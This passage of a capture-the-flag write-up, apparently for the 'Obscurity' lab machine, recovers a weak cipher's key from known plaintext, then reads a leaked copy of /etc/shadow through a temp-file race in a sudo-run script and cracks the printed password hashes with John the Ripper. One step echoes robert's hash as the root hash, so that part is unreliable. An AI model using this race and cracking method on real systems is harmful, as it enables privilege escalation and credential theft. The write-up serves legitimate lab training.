args = parser.parse_args()

banner = &#34;################################\n&#34;
banner&#43;= &#34;#           BEGINNING          #\n&#34;
banner&#43;= &#34;#    SUPER SECURE ENCRYPTOR    #\n&#34;
banner&#43;= &#34;################################\n&#34;
banner &#43;= &#34;  ############################\n&#34;
banner &#43;= &#34;  #        FILE MODE         #\n&#34;
banner &#43;= &#34;  ############################&#34;
print(banner)
if args.o == None or args.k == None or args.i == None:
    print(&#34;Missing args&#34;)
else:
    if args.d:
        print(&#34;Opening file {0}...&#34;.format(args.i))
        with open(args.i, &#39;r&#39;, encoding=&#39;UTF-8&#39;) as f:
            data = f.read()

        print(&#34;Decrypting...&#34;)
        decrypted = decrypt(data, args.k)
    
        print(&#34;Writing to {0}...&#34;.format(args.o))
        with open(args.o, &#39;w&#39;, encoding=&#39;UTF-8&#39;) as f:
            f.write(decrypted)
    else:
        print(&#34;Opening file {0}...&#34;.format(args.i))
        with open(args.i, &#39;r&#39;, encoding=&#39;UTF-8&#39;) as f:
            data = f.read()
    
        print(&#34;Encrypting...&#34;)
        encrypted = encrypt(data, args.k)
    
        print(&#34;Writing to {0}...&#34;.format(args.o))
        with open(args.o, &#39;w&#39;, encoding=&#39;UTF-8&#39;) as f:
            f.write(encrypted) </code></pre>
  


<p>Let&rsquo;s break it down to better understand how it works:</p>


  
    <pre class="language-python line-numbers"
      ><code class="language-python"
      >parser = argparse.ArgumentParser(description=&#39;Encrypt with 0bscura\&#39;s encryption algorithm&#39;)

parser.add_argument(&#39;-i&#39;, metavar=&#39;InFile&#39;, type=str, help=&#39;The file to read&#39;, required=False)

parser.add_argument(&#39;-o&#39;, metavar=&#39;OutFile&#39;, type=str, help=&#39;Where to output the encrypted/decrypted file&#39;, required=False)

parser.add_argument(&#39;-k&#39;, metavar=&#39;Key&#39;, type=str, help=&#39;Key to use&#39;, required=False)</code></pre>
  


<p>Reading the <code>argparse</code>  we can quickly understand what&rsquo;s this script will encrypt and decrypt a given file using a given key.</p>
<p>The function that interesting us is the encrypt function. Why is it interesting ? Because we have a clear text file and it&rsquo;s encrypted version (<code>check.txt</code> and <code>out.txt</code>).</p>
<p>The encrypt function looks like this:</p>


  
    <pre class="language-python line-numbers"
      ><code class="language-python"
      >def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = &#34;&#34;
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr &#43; ord(keyChr)) % 255)
        encrypted &#43;= newChr
        keyPos &#43;= 1
        keyPos = keyPos % keylen
    return encrypted </code></pre>
  


<p>12 lines, taking it step by step we should have a good understanding of what it is doing.</p>
<p>Let&rsquo;s start!</p>
<p>The function take 2 arguments, the text to encrypt and the secret key. Nothing surprising yet.</p>
<p>Second, third and fourth line respectively get the length of the key, initialize <code>keyPos</code> to <code>0</code> (which we can understand means &ldquo;key position&rdquo;) and initialize the <code>encrypted</code> variable that will for sure hold the final encrypted content since it&rsquo;s returned at the end of the function.</p>
<p>The <code>for</code> loop every character of the content to encrypt, this seems to confirm our previous assumption that the content is encrypted letter-by-letter.</p>
<p>Inside the for loop, the encrypt mechanism takes place.</p>
<p><code>keyChr = key[keyPos]</code> get the secret key letter position. For example if the secret password is <code>hg8</code> then at the first loop, <code>keyChr</code> will be <code>h</code>, second loop it will be <code>g</code> and third loop <code>8</code> since <code>keyPos</code> get incremented by one at the end of the loop.</p>
<p>Then, <code>ord()</code> function is used on the letter to encrypt. <a href="https://docs.python.org/3/library/functions.html#ord">Python documentation</a> explain:</p>
<blockquote>
<p>Given a string representing one Unicode character, return an integer
representing the Unicode code point of that character. For example, <code>ord('a')</code> returns the integer <code>97</code> and <code>ord('€')</code> (Euro sign)
returns <code>8364</code>. This is the inverse of <a href="https://docs.python.org/3/library/functions.html#chr" title="chr"><code>chr()</code></a>.</p>
</blockquote>
<p>Next line is where the Magic happens. Let&rsquo;s break it down:</p>
<ol>
<li>
<p><code>newChr + ord(keyChr)</code> : The integer unicode code of the character to encrypt gets added to the integer unicode code of the current key character.</p>
</li>
<li>
<p><code>(newChr + ord(keyChr)) % 255)</code> gets the remainder from the division of the <code>keyChr</code> addition by <code>255</code> to make sure it doesn&rsquo;t not exceed the Unicode code list.</p>
</li>
<li>
<p>Finally we convert the result integer of the operation back to string using <code>chr()</code></p>
</li>
</ol>
<p>The encrypted character then gets added to the final <code>encrypted</code> variable with <code>encrypted += newChr</code></p>
<p>The last two lines increments the key position, so that the next characters to be encrypted will be encrypted from the next character of the secret key and so on.</p>
<p><code>keyPos = keyPos % keylen</code> will restart the key position once we are at the end of the key. For example with <code>hg8</code> as a key, this is what will happen when <code>keyPos</code> is <code>3</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">keyPos <span style="color:#f92672">=</span> keyPos <span style="color:#f92672">%</span> keylen
keyPos <span style="color:#f92672">=</span>   <span style="color:#ae81ff">3</span>    <span style="color:#f92672">%</span>    <span style="color:#ae81ff">3</span>    
keyPos <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#75715e"># keyPos will be 0 since 3 divided by 3 gets 0 as remainder</span>
</code></pre></div><p>Alright ! This seems pretty clear now (and not very robust encryption).</p>
<p>I am not going to describe the <code>decrypt()</code> function since it&rsquo;s exactly the same but inverted.</p>
<p>Let&rsquo;s now focus on how, from an encrypted string and it&rsquo;s clear-text equivalent, we can find back the secret key used.</p>
<h3 id="recovering-the-secret-key">Recovering the secret key</h3>
<p>Seeing the encrypt logic it&rsquo;s easy to understand how to get back the key from an clear string and it&rsquo;s encrypted equivalent :</p>
<blockquote>
<p>Clear character + Key Character = Encrypted Character</p>
<p>Key Character = Encrypted Character - Clear character</p>
</blockquote>
<p>With that in mind we are going to write a little script to recover the secret key used to encrypt <code>check.txt</code> to <code>out.txt</code>. To start we will input both clear and encrypted value:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">clear <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Encrypting this file with your key should result in out.txt, make sure your key is correct!&#34;</span>
encrypted <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v&#34;</span>
</code></pre></div><p>Here you need to be careful when copy pasting, because space of the encrypted version are not &ldquo;usual&rdquo; spaces and could mess up your script if you paste it as normal spaces. Here is how it should looks like (in vim for example):</p>
<p><img src="https://user-images.githubusercontent.com/9076747/72752623-f6e33100-3bc2-11ea-92b6-a025983eb467.png" alt=""></p>
<p>Here is the final script I made:</p>


  
    <pre class="language-python line-numbers"
      ><code class="language-python"
      > def recover_key(clear, encrypt):
    key = &#34;&#34;
    position_clear = 0
    position_encrypt = 0

    for character in clear:
        clear_char = clear[position_clear]
        encrypt_char = encrypt[position_encrypt]
        key_char = chr(ord(encrypt_char) - ord(clear_char))
        key &#43;= key_char
        position_clear &#43;= 1
        position_encrypt &#43;= 1
    
    return key 

clear = &#34;Encrypting this file with your key should result in out.txt, make sure your key is correct!&#34;
encrypt = &#34;¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v&#34;

key = recover_key(clear, encrypt)
print(key) </code></pre>
  


<p>Let&rsquo;s run it:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ python get_secret_key.py
alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich
</code></pre></div><p>Looks good! The key is repeating (remember <code>keyPos = keyPos % keylen</code>) but we can easily see it&rsquo;s <code>alexandrovich</code>. Let&rsquo;s try to use it to decrypt <code>passwordreminder.txt</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@obscure:/home/robert/$ python SuperSecureCrypt.py -i passwordreminder.txt -o passwordreminder.clear.txt -k alexandrovich
<span style="color:#75715e">################################</span>
<span style="color:#75715e">#           BEGINNING          #</span>
<span style="color:#75715e">#    SUPER SECURE ENCRYPTOR    #</span>
<span style="color:#75715e">################################</span>
  <span style="color:#75715e">############################</span>
  <span style="color:#75715e">#        FILE MODE         #</span>
  <span style="color:#75715e">############################</span>
Opening file passwordreminder.txt...
Encrypting...
Writing to passwordreminder.clear.txt...
www-data@obscure:/home/robert/$ cat passwordreminder.clear.txt
SecThruObsFTW
</code></pre></div><p>Let&rsquo;s try to login to Robert account with this password:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh robert@obscurity.htb
robert@obscurity.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:

Last login: Wed Jan <span style="color:#ae81ff">22</span> 14:56:30 <span style="color:#ae81ff">2020</span> from 10.10.14.9
robert@obscure:~$ cat user.txt
exxxxxxxxxxxxxxxxxxx7
</code></pre></div><h2 id="root-flag">Root Flag</h2>
<h3 id="recon-1">Recon</h3>
<p>One of the first thing I do when doing recon for root is checking the sudoer file for uncommon configuration.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo -S -l
Matching Defaults entries <span style="color:#66d9ef">for</span> robert on obscure:
    env_reset, mail_badpass,
    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin

User robert may run the following commands on obscure:
    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
</code></pre></div><p>Interesting, another &ldquo;homemade&rdquo; script. And it can be run as <code>sudo</code>. Sounds like a bad idea to me. If we can find a flaw in this <code>BetterSSH.py</code> we will be able to escalate our privileges to root.</p>
<p>The python script is the following:</p>


  
    <pre class="language-python line-numbers"
      ><code class="language-python"
      >import sys
import random, string
import os
import time
import crypt
import traceback
import subprocess

path = &#39;&#39;.join(random.choices(string.ascii_letters &#43; string.digits, k=8))
session = {&#34;user&#34;: &#34;&#34;, &#34;authenticated&#34;: 0}
try:
    session[&#39;user&#39;] = input(&#34;Enter username: &#34;)
    passW = input(&#34;Enter password: &#34;)

    with open(&#39;/etc/shadow&#39;, &#39;r&#39;) as f:
        data = f.readlines()
    data = [(p.split(&#34;:&#34;) if &#34;$&#34; in p else None) for p in data]
    passwords = []
    for x in data:
        if not x == None:
            passwords.append(x)
    
    passwordFile = &#39;\n&#39;.join([&#39;\n&#39;.join(p) for p in passwords])
    with open(&#39;/tmp/SSH/&#39;&#43;path, &#39;w&#39;) as f:
        f.write(passwordFile)
    time.sleep(.1)
    salt = &#34;&#34;
    realPass = &#34;&#34;
    for p in passwords:
        if p[0] == session[&#39;user&#39;]:
            salt, realPass = p[1].split(&#39;$&#39;)[2:]
            break
    
    if salt == &#34;&#34;:
        print(&#34;Invalid user&#34;)
        os.remove(&#39;/tmp/SSH/&#39;&#43;path)
        sys.exit(0)
    salt = &#39;$6$&#39;&#43;salt&#43;&#39;$&#39;
    realPass = salt &#43; realPass
    
    hash = crypt.crypt(passW, salt)
    
    if hash == realPass:
        print(&#34;Authed!&#34;)
        session[&#39;authenticated&#39;] = 1
    else:
        print(&#34;Incorrect pass&#34;)
        os.remove(&#39;/tmp/SSH/&#39;&#43;path)
        sys.exit(0)
    os.remove(os.path.join(&#39;/tmp/SSH/&#39;,path))

except Exception as e:
    traceback.print_exc()
    sys.exit(0)

if session[&#39;authenticated&#39;] == 1:
    while True:
        command = input(session[&#39;user&#39;] &#43; &#34;@Obscure$ &#34;)
        cmd = [&#39;sudo&#39;, &#39;-u&#39;,  session[&#39;user&#39;]]
        cmd.extend(command.split(&#34; &#34;))
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        o,e = proc.communicate()
        print(&#39;Output: &#39; &#43; o.decode(&#39;ascii&#39;))
        print(&#39;Error: &#39;  &#43; e.decode(&#39;ascii&#39;)) if len(e.decode(&#39;ascii&#39;)) &gt; 0 else print(&#39;&#39;)

</code></pre>
  


<p>As the name suggest, this script aim to serve as a replacement for SSH.</p>
<p>After reading the code we can understand the main logic is the following:</p>
<ol>
<li>
<p>Get the user to input username and password</p>


  
    <pre class="language-python line-numbers"
      ><code class="language-python"
      >   session[&#39;user&#39;] = input(&#34;Enter username: &#34;)
   passW = input(&#34;Enter password: &#34;)</code></pre>
  


</li>
<li>
<p>Open and parse the <a href="https://www.tldp.org/LDP/lame/LAME/linux-admin-made-easy/shadow-file-formats.htmlhttps://www.tldp.org/LDP/lame/LAME/linux-admin-made-easy/shadow-file-formats.html"><code>/etc/shadow</code></a> file to a temporary file in <code>/tmp/SSH/</code></p>


  
    <pre class="language-python line-numbers"
      ><code class="language-python"
      >   path = &#39;&#39;.join(random.choices(string.ascii_letters &#43; string.digits, k=8))
   [...]
   with open(&#39;/etc/shadow&#39;, &#39;r&#39;) as f:
   
           data = f.readlines()
       data = [(p.split(&#34;:&#34;) if &#34;$&#34; in p else None) for p in data]
       passwords = []
       for x in data:
           if not x == None:
               passwords.append(x)
       
       passwordFile = &#39;\n&#39;.join([&#39;\n&#39;.join(p) for p in passwords])
       with open(&#39;/tmp/SSH/&#39;&#43;path, &#39;w&#39;) as f:
           f.write(passwordFile)</code></pre>
  


<p>at this point the created tmp file should like something like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root
$6$rixxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxch4dy
<span style="color:#ae81ff">111111</span>
<span style="color:#ae81ff">0</span>
<span style="color:#ae81ff">111111</span>
<span style="color:#ae81ff">1</span>
   
hugo
$6$qpePkxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxc6RAj/
<span style="color:#ae81ff">111111</span>
<span style="color:#ae81ff">0</span>
<span style="color:#ae81ff">111111</span>
<span style="color:#ae81ff">1</span>
</code></pre></div></li>
<li>
<p>Check if username exist, if username don&rsquo;t exist the temp file get removed and the script exit.</p>


  
    <pre class="language-python line-numbers"
      ><code class="language-python"
      >   for p in passwords:
   
           if p[0] == session[&#39;user&#39;]:
               salt, realPass = p[1].split(&#39;$&#39;)[2:]
               break
       
       if salt == &#34;&#34;:
           print(&#34;Invalid user&#34;)
           os.remove(&#39;/tmp/SSH/&#39;&#43;path)
           sys.exit(0)</code></pre>
  


</li>
<li>
<p>If the username exist, the password get hashed and compared to the hash in the temp file (coming from <code>/etc/shadow</code> ) to see if they match. In the end the temp file get removed wether the password was correct or not.</p>


  
    <pre class="language-python line-numbers"
      ><code class="language-python"
      >   salt = &#39;$6$&#39;&#43;salt&#43;&#39;$&#39;
   
       realPass = salt &#43; realPass
       
       hash = crypt.crypt(passW, salt)
       
       if hash == realPass:
           print(&#34;Authed!&#34;)
           session[&#39;authenticated&#39;] = 1
       else:
           print(&#34;Incorrect pass&#34;)
           os.remove(&#39;/tmp/SSH/&#39;&#43;path)
           sys.exit(0)
       os.remove(os.path.join(&#39;/tmp/SSH/&#39;,path))</code></pre>
  


</li>
<li>
<p>If the password if also correct we get dropped in a &ldquo;pseudo&rdquo; shell:</p>


  
    <pre class="language-python line-numbers"
      ><code class="language-python"
      >   if session[&#39;authenticated&#39;] == 1:
   
       while True:
           command = input(session[&#39;user&#39;] &#43; &#34;@Obscure$ &#34;)
           cmd = [&#39;sudo&#39;, &#39;-u&#39;,  session[&#39;user&#39;]]
           cmd.extend(command.split(&#34; &#34;))
           proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
       
           o,e = proc.communicate()
           print(&#39;Output: &#39; &#43; o.decode(&#39;ascii&#39;))
           print(&#39;Error: &#39;  &#43; e.decode(&#39;ascii&#39;)) if len(e.decode(&#39;ascii&#39;)) &gt; 0 else print(&#39;&#39;)</code></pre>
  


</li>
</ol>
<p>Alright! So with all of this in mind, what can of flaw can we find in that ?</p>
<p>First thing that came to my mind was to edit the script to display the retrieved root hash. But of course it can not be that easy, we don&rsquo;t have write rights since the file is owned by <code>root</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">robert@obscure:~/BetterSSH$ ls -l
total <span style="color:#ae81ff">4</span>
-rwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1805</span> Oct  <span style="color:#ae81ff">5</span> 13:09 BetterSSH.py
</code></pre></div><p>Then what? The temporary file catch the attention aswell&hellip; If we manage to read it before it get deleted, we could retrieve <code>root</code> user password hash. We are facing two issues here:</p>
<ol>
<li>
<p>The file name is random.</p>
</li>
<li>
<p>The file get deleted immediately after creation. The script allow no &ldquo;pause&rdquo; where we could read the file before it gets deleted.</p>
</li>
</ol>
<p>At this point we will need to write a script monitoring the <code>/tmp/SSH/</code> folder for any file creation and grab it&rsquo;s content as fast as possible before it get deleted.</p>
<p>To do so, I wrote a simple script:</p>


  
    <pre class="language-python line-numbers"
      ><code class="language-python"
      >import os

path = &#34;/tmp/SSH/&#34;

before = dict([(file, None) for file in os.listdir(path)])

while True:
    after = dict([(file, None) for file in os.listdir(path)])
    added = [file for file in after if file not in before]
    if added:
        with open(path &#43; added[0], &#39;r&#39;) as new_file:
            print(new_file.read())
    before = after
</code></pre>
  


<p>Basically the script will loop forever while listing file in <code>/tmp/SSH/</code>, if a new file is detected it will print its content.</p>
<p>Let&rsquo;s drop it on the server and give it a try:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">robert@obscure:/$ python3 /tmp/watch_ssh.py
</code></pre></div><p>In another shell let&rsquo;s run the <code>betterSSH.py</code> script:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">robert@obscure:~$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: hg8
Enter password: hg8
Invalid user
</code></pre></div><p>Going back to our script we can see it worked!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">robert@obscure:/$ python3 /tmp/watch_ssh.py
root
$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
<span style="color:#ae81ff">18226</span>
<span style="color:#ae81ff">0</span>
<span style="color:#ae81ff">99999</span>
<span style="color:#ae81ff">7</span>

robert
$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/
<span style="color:#ae81ff">18163</span>
<span style="color:#ae81ff">0</span>
<span style="color:#ae81ff">99999</span>
<span style="color:#ae81ff">7</span>
</code></pre></div><h3 id="cracking-root-password-hash">Cracking Root password hash</h3>
<p>Now that we have the hash let&rsquo;s hope it can be cracked. I will use john the ripper</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;</span>$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU<span style="color:#e6db74">.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/&#34;</span> &gt; roothash
<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ john --wordlist<span style="color:#f92672">=</span>~/SecLists/Passwords/Leaked-Databases/rockyou.txt roothash
Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
mercedes         <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>
Session completed
</code></pre></div><p>Alright! We have the root password, let&rsquo;s try to use it with the <code>betterSSH.py</code> script:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: root
Enter password: mercedes
Authed!
root@Obscure$ cat /root/root.txt
Output: 5xxxxxxxxxxxxxxxxxxxxxxxxx3
</code></pre></div><hr>
<p>As always do not hesitate to contact me for any questions or feedbacks.</p>
<p>See you next time !</p>
<p>-hg8</p>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h">Read other posts</span>
            <hr />
          </div>
          <div class="pagination__buttons">
            
            
              <span class="button next">
                <a href="/posts/pwnable/fd/">
                  <span class="button__text">FD - Pwnable.kr</span>
                  <span class="button__icon">→</span>
                </a>
              </span>
            
          </div>
        </div>
      
    


    
      
        <br><br>
<script src="https://utteranc.es/client.js"
        repo="hg8/hg8.github.io"
        issue-term="pathname"
        label="💬 Comment"
        theme="photon-dark"
        crossorigin="anonymous"
        async>
</script>

      
    

    </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <div class="footer__content">
        <span>© 2020</span>
        <span><a href="https://hg8.sh" target="_blank" rel="noopener">hg8.sh</a></span>
        <span>
          &nbsp; 
          <a class="social-icon" href="https://twitter.com/_hg8_" target="_blank" rel="noopener" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg></a>
          &nbsp; 
          <a class="social-icon" href="https://github.com/hg8" target="_blank" rel="noopener" title="Github"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a>
          &nbsp;
          <a class="social-icon" href="https://www.hackthebox.eu/profile/128102" target="_blank" rel="noopener" title="hackthebox"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path><polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline><line x1="12" y1="22.08" x2="12" y2="12"></line></svg></a>
          &nbsp; 
          <a class="social-icon" href="https://hg8.sh/index.xml" target="_blank" rel="noopener" title="RSS"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
        </span>
      </div>
    
  </div>
</footer>



<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>

      
    </div>

    
  </body>
</html>
